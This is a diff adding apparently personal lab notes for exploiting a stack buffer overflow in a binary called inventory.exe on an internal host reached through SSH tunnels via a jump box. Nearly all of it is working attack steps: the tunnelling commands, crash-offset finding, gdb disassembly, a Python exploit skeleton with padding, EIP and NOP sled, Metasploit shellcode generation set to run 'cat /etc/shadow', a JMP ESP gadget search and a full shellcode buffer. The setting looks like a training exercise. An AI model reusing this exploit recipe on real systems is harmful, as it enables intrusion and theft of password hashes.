@@ -1,0 +1,102 @@
+On the .111 is a function to exploit
+GET TO JUMP BOX
+ ssh localhost -L 31301:10.50.38.249:22
+GET TO .111
+ ssh localhost -p 31301 -L 31302:192.168.28.111:2222
+ 
+GET THE FILE:
+linops:~$  scp -P 31302 comrade@localhost:/.hidden/inventory.exe .
+
+Attempt overflow AKA flood the input with a bunch of As
+ex: 
+  Enter:
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+dmesg | tail -n 5
+segfault at 31634130
+31634130 << put this number into the offset section of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+OFFSET: Whatever you got from the site
+
+FIND THE EXPLOIT NEEDED 
+gdb ./inventory.exe
+pdisass main
+pdisass getTheGoods
+CRAFT PACKET: 
+  ##### linux_buffer.py
+#!/usr/bin/python
+
+#buffer
+buffer = "A" * 62
+
+#eip (placeholder)
+eip = "B" * 4
+
+#nop
+nop = "\x90" * 10
+
+#shellcode
+
+print(buffer + eip + nop)
+
+GET SHELLCODE
+msfconsole
+
+use payload/linux/x86/exec
+show options
+set CMD cat /etc/shadow << or whatever command you need to run
+show options
+generate -b "\x00\x20\x0a\x0d" -f python
+
+GET EIP STUFF (DO THIS ON THE MACHINE YOU WANT TO EXPLOIT)
+  env - gdb inventory.exe
+
+    show env
+    unset env LINES
+    unset env COLUMNS
+    show env
+
+
+  run
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    info proc map
+  find /b <startaddr>,<endaddr>,0xff,0xe4
+
+  find /b 0xf7de2000,0xffffe000,0xff,0xe4
+  -First Start Addr under the [heap]
+  -Last End Addr at the [stack]
+  -Copy the first 6 or so over to the script, only use one of them
+  #0xf7f6560f
+#0xf7f65aeb
+#0xf7f65aff
+#0xf7f65d6f
+#0xf7f65f97
+#0xf7f660cf
+#f7 f6 60 cf
+#cf 60 f6 f7
+eip = "\xcf\x60\xf6\xf7"
+
+
+  
+
+
+
+
+buf =  b""
+buf += b"\xbb\xf8\x60\xb4\x3c\xd9\xc2\xd9\x74\x24\xf4\x5f\x33"
+buf += b"\xc9\xb1\x11\x31\x5f\x12\x03\x5f\x12\x83\x3f\x64\x56"
+buf += b"\xc9\xd5\x6e\xce\xab\x7b\x17\x86\xe6\x18\x5e\xb1\x91"
+buf += b"\xf1\x13\x56\x62\x65\xfb\xc4\x0b\x1b\x8a\xea\x9e\x0b"
+buf += b"\x91\xec\x1e\xcb\xc9\x8d\x6a\xeb\x22\x60\xe0\x8e\x5f"
+buf += b"\x0e\x63\x24\x8f\xc0\x1d\xa1\xbd\x65\x91\x4c\x21\xe4"
+buf += b"\x30\xfa\x8b\x78\xdf\x60\xd4\x2f\x4c\xed\x35\x02\xf2"
+
+start 0xf7def000
+finish 0xffffe000 
+
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+0xf7f72c6b
+0xf7f72df7
+0xf7f7307b
+0xf7f7322b
